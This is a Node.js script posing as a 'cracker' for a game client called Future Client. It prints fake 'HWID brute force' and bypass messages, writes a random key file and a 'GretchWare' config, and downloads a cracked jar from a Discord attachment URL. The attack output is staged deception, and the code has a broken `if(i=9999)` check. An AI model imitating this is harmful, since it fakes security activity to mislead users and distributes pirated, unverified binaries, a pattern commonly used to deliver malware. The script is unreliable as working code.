console.log("initing deps")


const crypto =require('crypto')
const fs = require('fs')
const download = require('download')

const hwid = crypto.randomBytes(1046).toString('base64') 

console.log("STARTING HWID BRUTE FORCE ATTACK")

fs.writeFileSync("hwid.key",hwid)
console.log(hwid)

console.log("file written!")
console.log("Attempting to bypass future client cdn timer...")

for(let i=0; i < 10000; i++){
  console.log("[ERROR] failed attempt")
}
if(i=9999){
  console.log("STARTING DOWNLOAD!")
}


const configTemplate = "Author:GretchWare Inc., Date:06/19/2022,GretchKey:0x077FDAC,Additional Info:False"
fs.writeFileSync('config.cfg', `Config Defaults Loaded From Variable:${configTemplate}`)

// Url of the image
const file = 'https://cdn.discordapp.com/attachments/984605576770256959/988026173814624256/futureclient-cracked-by-gretchware.jar';
// Path at which image will get downloaded
const filePath = `${__dirname}/files`;
  
download(file,filePath)
.then(() => {
    console.log('Download Completed');
})